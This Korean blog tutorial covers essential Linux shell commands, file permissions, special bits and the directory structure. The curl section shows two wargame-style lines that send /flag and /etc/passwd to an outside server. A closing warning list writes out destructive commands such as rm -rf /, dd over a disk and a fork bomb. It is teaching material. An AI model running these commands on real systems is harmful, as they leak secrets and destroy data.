---
title: "리눅스 필수 명령어 가이드"
date: 2026-01-08T21:30:00+09:00
draft: false
weight: 1
aliases: ["/study"]

tags: ["Linux", "Dreamhack.io"]
categories: ["Linux"]

author: "AlwaysHyeon"

summary: "리눅스 셸 기본부터 고급 명령어까지"

showToc: true
TocOpen: true
---

## 셸(Shell)

셸은 사용자와 커널 사이에서 명령어를 해석하고 실행하는 인터페이스입니다.

### 터미널 실행 단축키
- **Windows/Linux**: `Ctrl + Alt + T`
- **macOS**: `Control + Option + T`

### 셸 프롬프트(Shell Prompt)

셸이 입력을 받을 준비가 되면 다음과 같은 프롬프트가 표시됩니다:

```bash
user@user-VirtualBox:~$
```

프롬프트 구조:
- `user`: 현재 로그인한 사용자 이름
- `user-VirtualBox`: 호스트(컴퓨터) 이름
- `~`: 현재 위치한 디렉토리 (홈 디렉토리)
- `$`: 일반 사용자 (`#`는 root)

### id 명령어

현재 사용자의 UID와 GID를 확인합니다.

```bash
id
```

출력:
```
uid=1000(user) gid=1000(user) groups=1000(user),4(adm),24(cdrom),27(sudo)
```

--------------------------------------------------------------------------------------------

## 기본 명령어

### 시스템 정보 및 관리

#### sudo apt update
apt 명령어로 설치 가능한 소프트웨어 패키지 목록을 업데이트합니다.

```bash
sudo apt update
```

#### sudo apt upgrade
리눅스에 설치된 소프트웨어 패키지의 버전을 업그레이드합니다.

```bash
sudo apt upgrade
```

### 디렉토리 탐색

#### pwd
현재 작업 중인 디렉토리의 경로를 출력합니다.

```bash
pwd
```

출력:
```
/home/user
```

#### ls
디렉토리의 내용을 출력합니다.

기본 사용법:
```bash
ls                    # 현재 디렉토리 내용
ls /home             # 특정 디렉토리 내용
```

유용한 옵션:
```bash
ls -l                # 상세 정보 포함
ls -a                # 숨김 파일 포함
ls -lh               # 사람이 읽기 쉬운 파일 크기
ls -lt               # 수정 시간순 정렬
ls -lS               # 파일 크기순 정렬
ls -lR               # 하위 디렉토리까지 재귀적으로 표시
```

#### cd
작업 중인 디렉토리를 변경합니다.

| 구분 | 기호/명령어 | 설명 | 예시 |
| :--- | :---: | :--- | :--- |
| **절대 경로** | `/` 시작 | 루트 디렉토리부터 모든 경로를 전부 적어서 표현 | `cd /home/user` |
| **상대 경로** | `..` 등 | 현재 디렉토리를 기준으로 상위 또는 하위 디렉토리로 이동 | `cd ..` |
| **홈 디렉토리** | `~` | 현재 로그인한 사용자의 홈 디렉토리 | `cd ~` 또는 `cd` |
| **이전 경로** | `-` | 직전에 위치했던 디렉토리 | `cd -` |
| **현재 디렉토리** | `.` | 현재 디렉토리 | `cd .` |

### 파일 및 디렉토리 생성

#### mkdir
디렉토리를 생성합니다.

```bash
mkdir new_dir                    # 단일 디렉토리 생성
mkdir dir1 dir2 dir3             # 여러 디렉토리 동시 생성
mkdir -p parent/child/grandchild # 상위 디렉토리까지 자동 생성
```

#### touch
비어있는 새로운 파일을 만들거나 기존 파일의 수정 시간을 업데이트합니다.

```bash
touch new_file
```

확인:
```bash
ls -l
```

출력:
```
-rw-rw-r-- 1 user user 0 12월  2 13:05 new_file
```

여러 파일 동시 생성:
```bash
touch file1.txt file2.txt file3.txt
```

### 파일 및 디렉토리 조작

#### mv
파일이나 디렉토리의 위치를 옮기거나 이름을 변경합니다.

이름 변경:
```bash
mv old_name new_name
```

파일 이동:
```bash
mv old_file ..
```

여러 파일을 디렉토리로 이동:
```bash
mv file1.txt file2.txt file3.txt /destination/
```

#### cp
파일이나 디렉토리를 복사합니다.

파일 복사:
```bash
cp hello world
```

디렉토리 복사:
```bash
cp -r source_dir destination_dir    # 디렉토리 전체 복사
```

유용한 옵션:
```bash
cp -i file1 file2    # 덮어쓰기 전 확인
cp -v file1 file2    # 복사 과정 표시
cp -u file1 file2    # 더 최신 파일만 복사
```

#### rm
파일이나 디렉토리를 삭제합니다.

파일 삭제:
```bash
rm file.txt
```

디렉토리 삭제:
```bash
rm -r directory_name    # 디렉토리와 내용물 전체 삭제
```

유용한 옵션:
```bash
rm -i file.txt       # 삭제 전 확인
rm -f file.txt       # 강제 삭제 (확인 없이)
rm -rf directory/    # 디렉토리 강제 삭제 (주의!)
```

### 파일 내용 보기

#### cat
파일의 내용을 출력합니다.

```bash
cat /etc/passwd
```

여러 파일 연결:
```bash
cat file1.txt file2.txt > combined.txt
```

#### head / tail
파일의 처음 또는 끝 부분만 출력합니다.

```bash
head file.txt           # 처음 10줄
head -n 20 file.txt     # 처음 20줄
tail file.txt           # 마지막 10줄
tail -n 50 file.txt     # 마지막 50줄
tail -f log.txt         # 실시간 로그 모니터링
```

#### less / more
파일 내용을 페이지 단위로 보여줍니다.

```bash
less large_file.txt     # 위아래 스크롤 가능, 검색 가능 (추천)
more large_file.txt     # 한 방향으로만 스크롤
```

less 명령어 내부에서:
- `Space`: 다음 페이지
- `b`: 이전 페이지
- `/word`: 단어 검색
- `q`: 종료

#### file
파일의 유형을 출력합니다.

```bash
file /bin/ls
```

출력:
```
/bin/ls: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV)
```

다양한 파일 타입 확인:
```bash
file document.pdf       # PDF document
file image.jpg          # JPEG image data
file script.sh          # Bourne-Again shell script
```

### 텍스트 출력 및 생성

#### echo
셸에 사용자가 입력한 텍스트를 출력합니다.

```bash
echo "Hello world!"
```

파일로 리다이렉션:
```bash
echo "Hello world!" > hello
```

파일에 추가:
```bash
echo "Another line" >> hello
```

변수 출력:
```bash
echo $HOME              # 홈 디렉토리 경로
echo $PATH              # PATH 환경 변수
echo $USER              # 현재 사용자 이름
```

### 검색 및 필터링

#### grep
전체에서 특정 문자열을 찾습니다.

기본 사용:
```bash
grep root /etc/passwd
```

유용한 옵션:
```bash
grep -i "error" log.txt          # 대소문자 구분 없이 검색
grep -r "TODO" .                 # 현재 디렉토리에서 재귀 검색
grep -n "function" script.py     # 줄 번호 포함
grep -v "comment" file.txt       # 패턴과 일치하지 않는 줄
grep -c "error" log.txt          # 일치하는 줄 개수만 출력
grep -A 3 "error" log.txt        # 일치 줄 + 다음 3줄
grep -B 2 "error" log.txt        # 일치 줄 + 이전 2줄
```

#### find
파일과 디렉토리를 검색합니다.

```bash
find /home -name "*.txt"                    # 이름으로 검색
find . -type f -name "test*"                # 파일만 검색
find . -type d -name "backup"               # 디렉토리만 검색
find . -mtime -7                            # 최근 7일 수정된 파일
find . -size +100M                          # 100MB 이상 파일
find . -name "*.log" -delete                # 찾은 파일 삭제
find . -name "*.sh" -exec chmod +x {} \;    # 찾은 파일에 명령 실행
```

#### which / whereis
명령어나 프로그램의 위치를 찾습니다.

```bash
which python        # python 명령어의 실행 파일 위치
which gcc           # gcc 컴파일러 위치
whereis ls          # ls 명령어의 바이너리, 소스, 매뉴얼 위치
```

### 프로세스 관리

#### ps
현재 실행 중인 프로세스를 확인합니다.

```bash
ps                  # 현재 터미널의 프로세스
ps aux              # 모든 프로세스 상세 정보
ps aux | grep nginx # 특정 프로세스 찾기
ps -ef              # 전체 프로세스 (다른 포맷)
```

#### top / htop
실시간으로 시스템 리소스와 프로세스를 모니터링합니다.

```bash
top                 # 기본 모니터링
htop                # 향상된 인터페이스 (설치 필요: sudo apt install htop)
```

top 내부 명령:
- `q`: 종료
- `k`: 프로세스 종료
- `M`: 메모리 사용량 정렬
- `P`: CPU 사용량 정렬

#### kill
프로세스를 종료합니다.

```bash
kill 1234           # PID 1234 프로세스 종료
kill -9 1234        # 강제 종료
killall nginx       # 이름으로 모든 nginx 프로세스 종료
```

### 도움말

#### man
특정 명령어의 매뉴얼을 보여줍니다.

```bash
man ls              # ls 명령어 매뉴얼
man grep            # grep 명령어 매뉴얼
man 5 passwd        # /etc/passwd 파일 형식 매뉴얼
```

man 페이지 탐색:
- `Space`: 다음 페이지
- `b`: 이전 페이지
- `/word`: 검색
- `q`: 종료

#### help / --help
간단한 도움말을 출력합니다.

```bash
ls --help
cp --help
help cd             # 내장 명령어
```

### 네트워크

#### curl
서버에 데이터를 보내거나 서버로부터 받는 데이터 전송 명령어입니다.

기본 사용:
```bash
curl https://example.com                    # 웹 페이지 내용 가져오기
```

주요 옵션:
```bash
curl -o file.html https://example.com       # 파일로 저장
curl -O https://example.com/file.zip        # 원본 이름으로 저장
curl -i https://example.com                 # 응답 헤더 포함
curl -L https://example.com                 # 리다이렉트 따라가기
```

HTTP 메소드:
```bash
# GET 요청 (기본)
curl https://api.example.com/users

# POST 요청
curl -X POST https://api.example.com/data \
  -H "Content-Type: application/json" \
  -d '{"name":"John","age":30}'

# PUT 요청
curl -X PUT https://api.example.com/users/1 \
  -d "name=Jane"

# DELETE 요청
curl -X DELETE https://api.example.com/users/1
```

워게임에서의 활용:
```bash
# 명령어 실행 결과를 서버로 전송
curl "http://myserver.com" -d "`cat /flag`"

# 파일 내용 전송
curl -X POST http://myserver.com -d "@/etc/passwd"
```

#### wget
파일을 다운로드합니다.

```bash
wget https://example.com/file.zip           # 파일 다운로드
wget -O custom_name.zip https://...         # 다른 이름으로 저장
wget -c https://example.com/large.iso       # 중단된 다운로드 이어받기
wget -r https://example.com                 # 웹사이트 전체 다운로드
```

### 압축 및 아카이브

#### tar
파일을 묶고 압축합니다.

```bash
tar -cvf archive.tar files/         # 묶기
tar -czvf archive.tar.gz files/     # 묶고 gzip 압축
tar -xvf archive.tar                # 풀기
tar -xzvf archive.tar.gz            # gzip 압축 해제하며 풀기
tar -tvf archive.tar                # 내용 확인
```

옵션 의미:
- `c`: create (생성)
- `x`: extract (추출)
- `v`: verbose (과정 표시)
- `f`: file (파일 지정)
- `z`: gzip 압축/해제
- `j`: bzip2 압축/해제

#### zip / unzip
zip 형식으로 압축합니다.

```bash
zip archive.zip file1 file2         # 압축
zip -r archive.zip directory/       # 디렉토리 압축
unzip archive.zip                   # 압축 해제
unzip -l archive.zip                # 내용만 확인
```

### 디스크 사용량

#### du
디렉토리와 파일의 디스크 사용량을 확인합니다.

```bash
du -h                   # 사람이 읽기 쉬운 형식
du -sh *                # 현재 디렉토리의 각 항목 크기
du -sh /home/user       # 특정 디렉토리 전체 크기
du -h --max-depth=1     # 1단계 깊이까지만
```

#### df
파일 시스템의 디스크 공간 사용량을 확인합니다.

```bash
df -h                   # 모든 파일 시스템
df -h /home             # 특정 디렉토리가 속한 파일 시스템
```

--------------------------------------------------------------------------------------------

## 고급 기능

### 와일드카드

와일드카드는 임의의 다른 문자를 나타낼 수 있는 특수 문자입니다.

**기본 와일드카드**

`?` - 임의의 1개 문자
```bash
ls file?.txt        # file1.txt, fileA.txt 등 매칭
ls test?            # test1, testa 등 매칭
```

`*` - 임의의 0개 이상 문자
```bash
ls *.txt            # 모든 .txt 파일
ls test*            # test로 시작하는 모든 파일
ls *backup*         # backup이 포함된 모든 파일
```

`[]` - 범위 지정
```bash
ls file[1-3].txt    # file1.txt, file2.txt, file3.txt
ls [abc]*           # a, b, c로 시작하는 파일
ls *.[ch]           # .c 또는 .h로 끝나는 파일
```

**실전 예시**

```bash
# .txt로 끝나는 모든 파일 삭제
rm *.txt

# file1, file2, file3... file9 선택
ls file[1-9]

# 이름이 정확히 3글자인 모든 파일
ls ???

# test로 시작하는 모든 파일을 /backup/으로 복사
cp test* /backup/

# 2024년 로그 파일 전체 보기
cat log-2024-*.txt

# JPG 또는 PNG 이미지 파일 이동
mv *.{jpg,png} images/
```

### 리다이렉션

리다이렉션은 모니터에 나타나는 표준 출력 혹은 키보드로 입력하는 표준 입력을 다른 곳으로 변경하는 작업입니다.

**표준 스트림**
- 표준 입력 (stdin): 0번, 키보드로부터의 입력
- 표준 출력 (stdout): 1번, 화면으로의 정상 출력
- 표준 에러 (stderr): 2번, 화면으로의 에러 메시지

**출력 리다이렉션**

`명령어 > 파일`
```bash
ls -l > file_list.txt          # 출력을 파일에 저장 (덮어쓰기)
echo "Hello" > greeting.txt
```

`명령어 >> 파일`
```bash
echo "Line 1" > log.txt        # 새로 생성
echo "Line 2" >> log.txt       # 추가
echo "Line 3" >> log.txt       # 추가
```

`명령어 2> 파일`
```bash
command 2> error.log           # 에러만 파일에 저장
command > output.txt 2> error.log  # 출력과 에러 분리
command > output.txt 2>&1      # 출력과 에러를 같은 파일에
command &> all.log             # 출력과 에러를 같은 파일에 (축약형)
```

**입력 리다이렉션**

`명령어 < 파일`
```bash
sort < unsorted.txt            # 파일 내용을 정렬
wc -l < file.txt               # 파일 줄 수 세기
```

**Here Document**
```bash
cat << EOF > file.txt
여러 줄의
텍스트를
입력할 수 있습니다
EOF
```

### 파이프

파이프는 리다이렉션의 한 형태로, 명령어 결과 표준 출력을 다른 명령어의 표준 입력으로 보낼 때 사용합니다. `|` 문자로 나타냅니다.

**기본 사용**
```bash
ls -l | grep ".txt"                    # ls 출력에서 .txt 검색
cat file.txt | wc -l                   # 파일 줄 수 세기
ps aux | grep nginx                    # 프로세스 필터링
```

**실전 파이프 활용**

```bash
# 가장 많이 사용하는 명령어 top 10
history | awk '{print $2}' | sort | uniq -c | sort -rn | head

# 특정 프로세스의 메모리 사용량 확인
ps aux | grep nginx | awk '{print $6}'

# 로그에서 에러만 필터링하여 개수 확인
cat app.log | grep ERROR | wc -l

# 디렉토리별 용량 확인 후 정렬
du -sh */ | sort -h

# 가장 큰 파일 10개 찾기
du -ah | sort -rh | head -10

# 특정 확장자 파일 개수
find . -name "*.py" | wc -l

# CPU 사용률 높은 프로세스 상위 5개
ps aux | sort -nrk 3 | head -5

# 특정 포트를 사용하는 프로세스 찾기
netstat -tuln | grep :80

# 중복 제거된 정렬된 목록
cat list.txt | sort | uniq

# 로그에서 IP 주소 추출 및 빈도 분석
grep -oE '\b([0-9]{1,3}\.){3}[0-9]{1,3}\b' access.log | sort | uniq -c | sort -rn
```

--------------------------------------------------------------------------------------------

## 권한

### 사용자(user)와 그룹(group)

리눅스의 각 사용자는 이름과 고유한 사용자 ID(UID)를 가집니다. 그룹은 여러 사용자가 속할 수 있으며, 그룹 이름과 고유한 그룹 ID(GID)를 가집니다.

파일이나 디렉토리에 사용자가 접근하면 사용자의 UID와 해당 사용자가 속한 그룹의 GID를 확인하여 정당한 권한을 가지고 있는지를 판단해 접근을 제어합니다.

**사용자 정보 확인**

`/etc/passwd`는 리눅스의 사용자 정보를 담고 있는 텍스트 파일입니다.

```bash
cat /etc/passwd
```

각 줄의 형식: `username:x:UID:GID:comment:home_directory:shell`

예시:
```
root:x:0:0:root:/root:/bin/bash
user:x:1000:1000:user,,,:/home/user:/bin/bash
```

**그룹 정보 확인**

`/etc/group`은 리눅스의 그룹 정보를 저장하는 텍스트 파일입니다.

```bash
cat /etc/group
```

**사용자 관련 명령어**

```bash
whoami                  # 현재 사용자 이름
id                      # 현재 사용자의 UID, GID 정보
groups                  # 현재 사용자가 속한 그룹들
users                   # 현재 로그인한 사용자들
```

### 파일 및 디렉토리 권한

리눅스는 사용자가 파일과 디렉토리에 접근하는 행위에 대해 권한으로 제어합니다. 각 파일과 디렉토리는 **소유자(owner)**와 **소유 그룹(group)**을 가집니다. 소유자는 파일 또는 디렉토리의 권한을 수정할 수 있는 능력을 가집니다.

**세 가지 접근 권한**

1. **읽기(Read, r)**: 파일 또는 디렉토리의 내용을 볼 수 있게 허용합니다.
   - 파일: 파일 내용을 읽을 수 있음
   - 디렉토리: 디렉토리 내 파일 목록을 볼 수 있음

2. **쓰기(Write, w)**: 파일 또는 디렉토리의 내용을 수정하거나 삭제하는 것을 허용합니다.
   - 파일: 파일 내용을 수정하거나 삭제할 수 있음
   - 디렉토리: 디렉토리 내에 파일을 생성하거나 삭제할 수 있음

3. **실행(Execute, x)**: 파일이 프로그램인 경우 실행할 수 있게 허용합니다.
   - 파일: 프로그램으로 실행할 수 있음
   - 디렉토리: 디렉토리에 접근(cd)할 수 있음

**권한 확인하기**

파일이나 디렉토리의 권한을 보기 위해 `ls -l`을 사용합니다.

```bash
ls -l
```

출력 예시:
```
total 12
drwxrwxr-x 2 user user 4096 12월  2 13:38 dir
---------- 1 user user   13 12월  2 13:05 hello
-rwxrw-r-- 1 user user   13 12월  2 13:08 world
```

### 권한 플래그 해석

```bash
drwxrwxr-x 2 user user 4096 12월 2 13:38 dir
```

권한 플래그 `drwxrwxr-x`는 4개 부분으로 나뉩니다:

```
d rwx rwx r-x
│ └┬┘ └┬┘ └┬┘
│  │   │   └──→ 기타 사용자 권한 (r-x: 읽기, 실행)
│  │   └──────→ 그룹 권한 (rwx: 읽기, 쓰기, 실행)
│  └──────────→ 소유자 권한 (rwx: 읽기, 쓰기, 실행)
└─────────────→ 파일 타입 (d: 디렉토리)
```

**파일 타입 (첫 번째 문자)**
- `d`: 디렉토리 (directory)
- `-`: 일반 파일 (regular file)
- `l`: 심볼릭 링크 (symbolic link)
- `b`: 블록 디바이스 (block device)
- `c`: 문자 디바이스 (character device)
- `s`: 소켓 (socket)
- `p`: 파이프 (pipe)

**권한 문자**
- `r`: 읽기 권한 (Read)
- `w`: 쓰기 권한 (Write)
- `x`: 실행 권한 (Execute)
- `-`: 해당 권한 없음

**권한의 숫자 표현**

권한은 2진수나 10진수로도 표현할 수 있습니다.

| 권한 | 2진수 | 10진수 | 의미 |
|:----:|:-----:|:------:|:-----|
| `---` | 000 | 0 | 권한 없음 |
| `--x` | 001 | 1 | 실행만 |
| `-w-` | 010 | 2 | 쓰기만 |
| `-wx` | 011 | 3 | 쓰기, 실행 |
| `r--` | 100 | 4 | 읽기만 |
| `r-x` | 101 | 5 | 읽기, 실행 |
| `rw-` | 110 | 6 | 읽기, 쓰기 |
| `rwx` | 111 | 7 | 모든 권한 |

예시:
- `rwx` = `111` = **7**
- `rw-` = `110` = **6**
- `r--` = `100` = **4**
- `rwxrw-r--` = **764**

**소유자와 소유 그룹**

```bash
drwxrwxr-x 2 user user 4096 12월 2 13:38 dir
              ↑    ↑
         소유자  소유그룹
```

- **세 번째 열**: 파일/디렉토리의 소유자
- **네 번째 열**: 파일/디렉토리의 소유 그룹

**종합 예시**

```bash
-rwxrw-r-- 1 user user 13 12월 2 13:08 world
```

해석:
- **파일 타입**: `-` (일반 파일)
- **소유자 권한**: `rwx` (읽기, 쓰기, 실행 가능)
- **그룹 권한**: `rw-` (읽기, 쓰기 가능, 실행 불가)
- **기타 권한**: `r--` (읽기만 가능)
- **소유자**: `user`
- **소유 그룹**: `user`

--------------------------------------------------------------------------------------------

## 파일 및 디렉토리 권한 명령어

### chmod

`chmod`는 파일 권한을 변경하는 명령어입니다. `root` 사용자 혹은 파일의 소유자만 실행할 수 있습니다.

**형식**
```bash
chmod 권한 파일명
```

**숫자 모드**

```bash
chmod 764 hello
```

확인:
```bash
ls -l
```

출력:
```
-rwxrw-r-- 1 user user 13 12월 2 13:05 hello
```

**기호 모드**

대상:
- `u`: 소유자 (user)
- `g`: 그룹 (group)
- `o`: 기타 (others)
- `a`: 모두 (all)

연산:
- `+`: 권한 추가
- `-`: 권한 제거
- `=`: 권한 설정

권한 추가:
```bash
chmod g+x hello
```

출력:
```
-rwxrwxr-- 1 user user 13 12월 2 13:05 hello
```

권한 제거:
```bash
chmod g-wx hello
```

출력:
```
-rwxr--r-- 1 user user 13 12월 2 13:05 hello
```

**유용한 예시**

```bash
chmod 644 file.txt          # rw-r--r-- (일반 파일)
chmod 755 script.sh         # rwxr-xr-x (실행 파일)
chmod 700 private.txt       # rwx------ (소유자만 접근)
chmod 777 public_dir        # rwxrwxrwx (모두 접근, 위험!)
chmod -R 755 directory/     # 디렉토리와 내부 파일 전체에 적용
chmod u+x script.sh         # 소유자에게 실행 권한 추가
chmod a-w file.txt          # 모두에게서 쓰기 권한 제거
chmod o-rwx private         # 기타 사용자 모든 권한 제거
```

### chown

`chown`은 파일 소유자 혹은 소유 그룹을 변경하는 명령어입니다. `root` 사용자만 실행할 수 있습니다.

**형식**
```bash
chown 사용자명[:그룹명] 파일명
```

**소유자 변경**

```bash
sudo chown root hello
```

확인:
```bash
ls -l
```

출력:
```
-rwxr--r-- 1 root user 13 12월 2 13:05 hello
```

이제 일반 사용자는 이 파일을 수정할 수 없습니다:
```bash
echo "hello" > hello
```

출력:
```
bash: hello: Permission denied
```

**소유자와 그룹 동시 변경**

```bash
sudo chown root:root hello              # 소유자와 그룹을 root로
sudo chown user:developers file.txt     # 특정 사용자와 그룹으로
sudo chown -R user:user directory/      # 디렉토리 전체에 재귀적으로 적용
```

### chgrp

`chgrp`는 소유 그룹만 변경하는 명령어입니다.

```bash
sudo chgrp developers file.txt          # 그룹만 변경
sudo chgrp -R www-data /var/www/        # 디렉토리 전체에 적용
```

--------------------------------------------------------------------------------------------

## 특수 권한

앞서 배운 r, w, x 권한 외에 특수한 권한 3가지가 있습니다.

### setuid (Set User ID)

일반 사용자가 파일을 실행하면 파일 소유자 권한으로 실행됩니다.

**예시**: `/bin/passwd`
```bash
ls -l /bin/passwd
```

출력:
```
-rwsr-xr-x 1 root root 59976 11월 24 21:05 passwd
```

소유자의 실행 권한에 `x` 대신 `s`가 표시됩니다. 일반 사용자가 `passwd` 명령을 실행하면 root 권한으로 실행되어 자신의 비밀번호를 변경할 수 있습니다.

- `s`: setuid가 설정되고 실행 권한도 있음
- `S`: setuid는 설정되었지만 실행 권한이 없음 (의미 없음)

### setgid (Set Group ID)

일반 사용자가 파일을 실행하면 파일 소유 그룹 권한으로 실행됩니다.

소유 그룹의 실행 권한에 `x` 대신 `s`가 표시됩니다.

디렉토리에 setgid를 설정하면 해당 디렉토리 내에서 생성되는 모든 파일이 디렉토리의 그룹을 상속받습니다.

```
drwxr-sr-x 2 user developers 4096 12월 2 13:38 shared_dir
```

- `s`: setgid가 설정되고 실행 권한도 있음
- `S`: setgid는 설정되었지만 실행 권한이 없음

### sticky bit

디렉토리에 sticky bit를 설정하면 파일 및 디렉토리 소유자와 root 사용자 외에는 일반 사용자가 파일을 삭제할 수 없습니다. 주로 공용 디렉토리에 사용합니다.

**예시**: `/tmp` 디렉토리
```
drwxrwxrwt 20 root root 4096 12월 1 14:17 tmp
```

일반 사용자의 실행 권한에 `x` 대신 `t`가 표시됩니다.

- `t`: sticky bit가 설정되고 실행 권한도 있음
- `T`: sticky bit는 설정되었지만 실행 권한이 없음

### 특수 권한 설정

특수 권한은 숫자 형식으로 권한 플래그 맨 앞에 붙여 표현합니다:
- **setuid**: 4
- **setgid**: 2
- **sticky bit**: 1

**숫자 모드**

```bash
chmod 4775 world
```

확인:
```bash
ls -l
```

출력:
```
-rwsrwxr-x 1 user user 13 12월 2 13:08 world
```

**기호 모드**

```bash
chmod u+s file          # setuid 설정
chmod g+s directory     # setgid 설정
chmod o+t directory     # sticky bit 설정
chmod u-s file          # setuid 제거
```

**조합 예시**

```bash
chmod 4755 program      # rwsr-xr-x (setuid)
chmod 2755 shared_dir   # rwxr-sr-x (setgid)
chmod 1777 /tmp         # rwxrwxrwt (sticky bit)
chmod 6755 file         # rwsr-sr-x (setuid + setgid)
```

--------------------------------------------------------------------------------------------

## 디렉토리 구조

### 루트 디렉토리 `/`

루트 디렉토리는 리눅스의 최상위 디렉토리이며, 절대 경로는 `/`입니다.

```bash
ls -l /
```

출력 예시:
```
lrwxrwxrwx   1 root root          7 11월 30 18:15 bin -> usr/bin
drwxr-xr-x   4 root root       4096 12월  1 14:10 boot
drwxr-xr-x  19 root root       4180 12월  1 14:25 dev
drwxr-xr-x 130 root root      12288 12월  1 14:09 etc
drwxr-xr-x   3 root root       4096 11월 30 18:27 home
drwx------   2 root root      16384 11월 30 18:14 lost+found
drwxr-xr-x   3 root root       4096 11월 30 19:49 media
drwxr-xr-x   2 root root       4096  8월  9 20:48 mnt
drwxr-xr-x   3 root root       4096 11월 30 19:55 opt
dr-xr-xr-x 257 root root          0 12월  1 14:11 proc
drwx------   4 root root       4096 12월  1 14:17 root
drwxr-xr-x  33 root root        900 12월  1 14:12 run
lrwxrwxrwx   1 root root          8 11월 30 18:15 sbin -> usr/sbin
drwxr-xr-x   2 root root       4096  8월  9 20:48 srv
dr-xr-xr-x  13 root root          0 12월  1 14:11 sys
drwxrwxrwt  20 root root       4096 12월  1 14:17 tmp
drwxr-xr-x  14 root root       4096  8월  9 20:48 usr
drwxr-xr-x  14 root root       4096  8월  9 20:54 var
```

### 주요 디렉토리 설명

#### `/bin` - 기본 명령어
일반 사용자가 사용할 수 있는 기본적인 명령어나 프로그램을 담고 있는 디렉토리입니다.

```
ls, cp, mv, rm, cat, echo, mkdir, chmod, ps 등
```

최신 시스템에서는 `/usr/bin`으로의 심볼릭 링크입니다.

#### `/boot` - 부팅 파일
시스템 부팅에 필요한 파일들을 담고 있는 디렉토리입니다.

```
커널 이미지, 부트로더 설정 파일, initramfs 등
```

#### `/dev` - 디바이스 파일
컴퓨터에 부착된 물리적인 장치들을 파일 형태로 접근할 수 있게 합니다.

```bash
/dev/sda    # 첫 번째 하드 디스크
/dev/sda1   # 첫 번째 하드 디스크의 첫 번째 파티션
/dev/null   # null 디바이스 (출력 버리기에 사용)
/dev/zero   # 0을 무한히 생성
/dev/random # 난수 생성기
```

#### `/etc` - 설정 파일
운영체제나 운영체제 위에서 동작하는 서비스의 설정 파일들을 담고 있는 디렉토리입니다.

```bash
/etc/passwd         # 사용자 정보
/etc/group          # 그룹 정보
/etc/hosts          # 호스트 이름 매핑
/etc/hostname       # 시스템 호스트명
/etc/ssh/           # SSH 서버 설정
/etc/nginx/         # Nginx 웹서버 설정
/etc/apache2/       # Apache 웹서버 설정
```

#### `/home` - 사용자 홈 디렉토리
각 일반 사용자의 홈 디렉토리를 담고 있는 디렉토리입니다.

```bash
/home/user      # user 사용자의 홈 디렉토리
/home/dream     # dream 사용자의 홈 디렉토리
```

각 사용자는 자신의 홈 디렉토리에서 완전한 권한을 가집니다.

#### `/lib`, `/lib32`, `/lib64` - 라이브러리
시스템에 필요한 라이브러리 파일들을 담고 있는 디렉토리입니다.

```
공유 라이브러리, 커널 모듈 등
```

`/bin`이나 `/sbin`의 프로그램이 필요로 하는 동적 라이브러리 파일이 존재합니다.

#### `/media` - 이동식 미디어
이동식 미디어(USB, CD/DVD 등)가 자동으로 마운트되는 디렉토리입니다.

```bash
/media/user/USB_DRIVE
/media/user/CDROM
```

#### `/mnt` - 임시 마운트
파일 시스템을 임시로 마운트하는 데 사용하는 디렉토리입니다.

```bash
sudo mount /dev/sdb1 /mnt
```

#### `/opt` - 선택적 소프트웨어
추가로 설치한 소프트웨어 패키지들을 담는 디렉토리입니다.

```bash
/opt/google/chrome
/opt/teamviewer
```

#### `/proc` - 프로세스 정보
리눅스 커널 자원에 접근할 수 있는 가상 파일 시스템입니다. 프로세스와 시스템 정보를 파일 형태로 제공합니다.

```bash
/proc/cpuinfo       # CPU 정보
/proc/meminfo       # 메모리 정보
/proc/[PID]/        # 각 프로세스 정보
/proc/version       # 커널 버전
```

#### `/root` - root 사용자 홈
root 사용자의 홈 디렉토리입니다. `/home/root`가 아님에 주의하세요.

#### `/run` - 런타임 데이터
시스템이 부팅된 이후 런타임 데이터를 저장합니다.

```
PID 파일, 소켓 파일 등
```

#### `/sbin` - 시스템 관리 명령어
`/bin` 디렉토리와 유사하지만, `root` 사용자가 사용하는 시스템 관리 명령어를 포함합니다.

```
fdisk, mkfs, shutdown, reboot, iptables 등
```

#### `/srv` - 서비스 데이터
시스템에서 제공하는 서비스의 데이터를 저장하는 디렉토리입니다.

```bash
/srv/www    # 웹 서버 데이터
/srv/ftp    # FTP 서버 데이터
```

#### `/sys` - 시스템 정보
커널과 하드웨어 정보를 제공하는 가상 파일 시스템입니다.

#### `/tmp` - 임시 파일
사용자나 프로그램이 임시로 파일을 생성할 때 사용하는 디렉토리입니다.

**주의**: 시스템 재부팅 시 또는 일정 시간이 지나면 파일이 자동으로 삭제될 수 있습니다.

```
drwxrwxrwt  # sticky bit로 보호됨
```

#### `/usr` - 사용자 프로그램
사용자 바이너리, 문서, 라이브러리, 헤더 파일 등을 담고 있는 디렉토리입니다.

```bash
/usr/bin/       # 사용자 명령어
/usr/sbin/      # 시스템 관리 명령어
/usr/lib/       # 라이브러리
/usr/local/     # 로컬에 설치한 프로그램
/usr/share/     # 아키텍처 독립적인 데이터
/usr/include/   # C 헤더 파일
```

#### `/var` - 가변 데이터
프로그램이나 시스템이 실시간으로 가변적인 파일을 사용하고 저장할 때 활용하는 디렉토리입니다.

```bash
/var/log/       # 각종 로그 파일
/var/www/       # 웹 서버 루트 (보통)
/var/mail/      # 메일 스풀
/var/spool/     # 대기열 데이터 (프린터, cron 등)
/var/tmp/       # 재부팅 후에도 유지되는 임시 파일
/var/cache/     # 애플리케이션 캐시
```

--------------------------------------------------------------------------------------------

## 주의사항 및 안전 사용 팁

### 위험한 명령어들


```bash
rm -rf /            # 시스템 전체 삭제 (현대 시스템은 보호됨)
rm -rf /*           # 루트 디렉토리의 모든 내용 삭제
chmod 777 -R /      # 모든 파일 권한 열기 (심각한 보안 위험)
dd if=/dev/zero of=/dev/sda    # 디스크 전체 초기화
mkfs.ext4 /dev/sda  # 파티션 포맷 (데이터 삭제)
:(){ :|:& };:       # Fork bomb (시스템 멈춤)
```

### 안전한 사용 습관

**1. 삭제 전 항상 확인**
```bash
ls -l file*         # 먼저 어떤 파일이 매칭되는지 확인
rm -i file*         # 삭제 전 각 파일마다 확인
```

**2. 중요한 작업 전 백업**
```bash
cp important.txt important.txt.backup
tar -czf backup_$(date +%Y%m%d).tar.gz /important/directory/
```

**3. sudo 사용 시 신중하게**
```bash
# 나쁜 예
sudo rm -rf /tmp ../file    # 경로 실수 시 위험

# 좋은 예
ls -l /tmp ../file          # 먼저 확인
sudo rm -rf /tmp ../file    # 확인 후 실행
```

**4. 와일드카드 사용 시 주의**
```bash
# 나쁜 예
rm * .txt           # 모든 파일 삭제 후 .txt 삭제 시도

# 좋은 예
rm *.txt            # .txt 파일만 삭제
